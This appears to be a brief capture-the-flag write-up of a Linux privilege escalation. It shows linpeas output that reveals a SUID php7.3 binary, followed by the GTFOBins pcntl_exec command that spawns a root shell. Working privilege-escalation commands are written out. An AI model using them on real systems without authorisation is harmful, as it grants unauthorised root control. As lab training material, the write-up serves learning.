after gaining access to the shell using 'sudo -l' ---> sudo not installed

so i decide to run linpeas.sh and I notice this output :
*
-rwsr-xr-x 1 root root 4.6M Feb 13  2021 /usr/bin/php7.3 (Unknown SUID binary)
*

SUID bit is set meaning every user can run php7.3 as superuser 
with a quick research (https://gtfobins.github.io/gtfobins/php/) using this commands 

A] CMD="/bin/sh"
B] ./php -r "pcntl_exec('/bin/sh', ['-p']);"

spawn a shell as root 


MACHINE COMPLETED!
